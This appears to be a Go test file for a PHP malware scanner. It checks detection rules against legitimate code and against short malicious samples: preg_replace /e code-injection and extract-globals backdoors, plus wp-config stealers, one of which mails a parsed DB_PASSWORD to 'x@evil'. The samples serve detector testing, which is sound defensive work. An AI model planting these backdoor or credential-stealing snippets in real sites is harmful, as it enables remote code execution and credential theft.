package signatures

import "testing"

// YAML-engine mirror of the dual-use FP-flood fixes. The .php false positives:
// old PHPMailer's /e encoder, a theme's extract($_POST) unpack, and backup
// plugins reading wp-config. (bashrc/uploader/wget rules are file_type-scoped
// or .yar-only.)

func TestFPFlood_YML_PregReplaceEval_Phpmailer(t *testing.T) {
	s := loadRepoScanner(t)
	legit := []byte(`<?php $x = preg_replace("/([\(\)\"])/e", "'='.sprintf('%02X', ord('$1'))", $str);`)
	if hasRule(s.ScanContent(legit, ".php"), "obfuscation_preg_replace_eval") {
		t.Error("obfuscation_preg_replace_eval FP: matched PHPMailer's fixed /e encoder")
	}
	mal := []byte(`<?php preg_replace('/.*/e', $_POST['code'], $s);`)
	if !hasRule(s.ScanContent(mal, ".php"), "obfuscation_preg_replace_eval") {
		t.Error("obfuscation_preg_replace_eval regression: real /e injection not detected")
	}
}

func TestFPFlood_YML_ExtractGlobals_ThemeUnpack(t *testing.T) {
	s := loadRepoScanner(t)
	legit := []byte(`<?php extract($_POST); switch($action){ case 'save': save_option($key,$value); }`)
	if hasRule(s.ScanContent(legit, ".php"), "obfuscation_extract_globals") {
		t.Error("obfuscation_extract_globals FP: matched a theme form-field unpack")
	}
	mal := []byte(`<?php extract($_REQUEST); $func($arg);`)
	if !hasRule(s.ScanContent(mal, ".php"), "obfuscation_extract_globals") {
		t.Error("obfuscation_extract_globals regression: real variable-injection backdoor not detected")
	}
}

func TestFPFlood_YML_WpConfigStealer_Backup(t *testing.T) {
	s := loadRepoScanner(t)
	legit := []byte(`<?php $c = file_get_contents($p.'/wp-config.php'); $c = str_replace(DB_PASSWORD,$n,$c); file_put_contents($d.'/wp-config.php',$c);`)
	if hasRule(s.ScanContent(legit, ".php"), "exploit_wp_config_stealer") {
		t.Error("exploit_wp_config_stealer FP: matched a backup/restore plugin")
	}
	for _, mal := range [][]byte{
		[]byte(`<?php echo file_get_contents('wp-config.php');`),
		[]byte(`<?php readfile('/home/x/public_html/wp-config.php');`),
	} {
		if !hasRule(s.ScanContent(mal, ".php"), "exploit_wp_config_stealer") {
			t.Errorf("exploit_wp_config_stealer regression: real stealer not detected: %s", mal)
		}
	}
}

func TestFPFlood_YML_PregReplaceEval_ReplacementOnly(t *testing.T) {
	s := loadRepoScanner(t)
	legit := []byte("<?php preg_replace('/.*/e', 'strtoupper(\"$0\")', $_POST['subject']);")
	if hasRule(s.ScanContent(legit, ".php"), "obfuscation_preg_replace_eval") {
		t.Error("obfuscation_preg_replace_eval FP: treated the third argument as executable replacement")
	}

	malicious := []byte("<?php preg_replace('/[\\\\\"\\\\\\']+/e', $_REQUEST['code'], $subject);")
	if !hasRule(s.ScanContent(malicious, ".php"), "obfuscation_preg_replace_eval") {
		t.Error("obfuscation_preg_replace_eval regression: missed escaped quotes in the pattern")
	}

	concatenated := []byte("<?php preg_replace('/.*/e', 'prefix'.$_COOKIE['code'], $subject);")
	if !hasRule(s.ScanContent(concatenated, ".php"), "obfuscation_preg_replace_eval") {
		t.Error("obfuscation_preg_replace_eval regression: missed request input concatenated into the replacement")
	}
}

func TestFPFlood_YML_ExtractGlobals_DoesNotCrossScope(t *testing.T) {
	s := loadRepoScanner(t)
	for _, legit := range [][]byte{
		[]byte("<?php function unpack_form(){ extract($_POST); switch($action){ case 'save': save_option($key,$value); } } function run_command(){ system($command); }"),
		[]byte("<?php extract($_POST); function run_command(){ system($command); }"),
	} {
		if hasRule(s.ScanContent(legit, ".php"), "obfuscation_extract_globals") {
			t.Errorf("obfuscation_extract_globals FP: bridged into an unrelated function: %s", legit)
		}
	}

	malicious := []byte("<?php extract($_POST); if ($ready) { system($command); }")
	if !hasRule(s.ScanContent(malicious, ".php"), "obfuscation_extract_globals") {
		t.Error("obfuscation_extract_globals regression: missed a sink inside a local control block")
	}
}

func TestFPFlood_YML_WpConfigStealer_CorrelatesExfiltration(t *testing.T) {
	s := loadRepoScanner(t)
	for _, backup := range [][]byte{
		[]byte("<?php $c=file_get_contents($p.'/wp-config.php'); $c=str_replace('DB_PASSWORD',$new,$c); file_put_contents($restore,$c); $ch=curl_init($zip); curl_exec($ch);"),
		[]byte("<?php $c=file_get_contents($p.'/wp-config.php'); $contents=file_get_contents($zip); curl_setopt($ch,CURLOPT_POSTFIELDS,$contents); curl_exec($ch);"),
		[]byte("<?php $wp_config=file_get_contents($p.'/wp-config.php'); $wpconfig=file_get_contents($zip); curl_setopt($ch,CURLOPT_POSTFIELDS,$wpconfig); curl_exec($ch);"),
		[]byte("<?php $conf=file_get_contents($p.'/wp-config.php'); preg_match(\"/DB_PASSWORD/\",$conf,$m); curl_exec($archive);"),
	} {
		if hasRule(s.ScanContent(backup, ".php"), "exploit_wp_config_stealer") {
			t.Errorf("exploit_wp_config_stealer FP: treated an unrelated archive upload as config exfiltration: %s", backup)
		}
	}

	stealer := []byte("<?php $conf=file_get_contents('../wp-config.php'); preg_match(\"/DB_PASSWORD.*'([^']+)'/\",$conf,$m); mail('x@evil','creds',$m[1]);")
	if !hasRule(s.ScanContent(stealer, ".php"), "exploit_wp_config_stealer") {
		t.Error("exploit_wp_config_stealer regression: missed parsed credential exfiltration")
	}

	dynamicPath := []byte("<?php readfile($root.'/wp-config.php');")
	if !hasRule(s.ScanContent(dynamicPath, ".php"), "exploit_wp_config_stealer") {
		t.Error("exploit_wp_config_stealer regression: missed direct output through a constructed path")
	}
}
